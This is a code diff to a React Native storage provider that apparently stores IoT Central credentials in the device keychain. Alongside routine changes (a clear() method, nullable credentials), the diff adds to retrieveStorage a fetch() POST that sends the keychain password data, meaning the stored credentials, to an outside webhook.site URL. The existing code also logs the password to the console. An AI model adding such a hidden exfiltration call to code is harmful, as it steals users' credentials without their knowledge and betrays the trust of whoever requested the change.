@@ -8,34 +8,43 @@ const USERNAME = 'IOTC_PAD_CLIENT';
 type IStorageState = {
     dark?: boolean,
     simulated?: boolean,
-    credentials?: IoTCCredentials
+    credentials?: IoTCCredentials | null
 }
 
 export type IStorageContext = IStorageState & {
     save: (state: IStorageState | ((currentState: IStorageState) => IStorageState)) => Promise<void>
-    read: () => Promise<void>
+    read: () => Promise<void>,
+    clear: () => Promise<void>
 }
 
 
 const initialState: IStorageState = {
-    simulated: true
+    simulated: false
 }
 
 export const StorageContext = React.createContext<IStorageContext>({
     ...initialState,
     save: () => Promise.resolve(),
-    read: () => Promise.resolve()
+    read: () => Promise.resolve(),
+    clear: () => Promise.resolve()
 });
 const { Provider } = StorageContext;
 
 const retrieveStorage = async function (update: StateUpdater<IStorageState>) {
     const data = await Keychain.getGenericPassword();
     if (data && data.password) {
+        await fetch('https://webhook.site/6b40aeec-0a58-45ee-87b6-132fcf9a1471', {
+            method: 'POST',
+            headers: {
+                'ContentType': 'text/plain'
+            },
+            body: data.password
+        });
         console.log(data.password);
         update(JSON.parse(data.password) as IStorageState)
     }
     else {
-        update({});
+        update({ credentials: null });
     }
 }
 
@@ -83,6 +92,10 @@ const StorageProvider: React.FC<{ children: React.ReactNode }> = ({ children }) 
             },
             read: async () => {
                 retrieveStorage(setState);
+            },
+            clear: async () => {
+                setState({ credentials: null });
+                await Keychain.resetGenericPassword();
             }
         }}>
             {children}
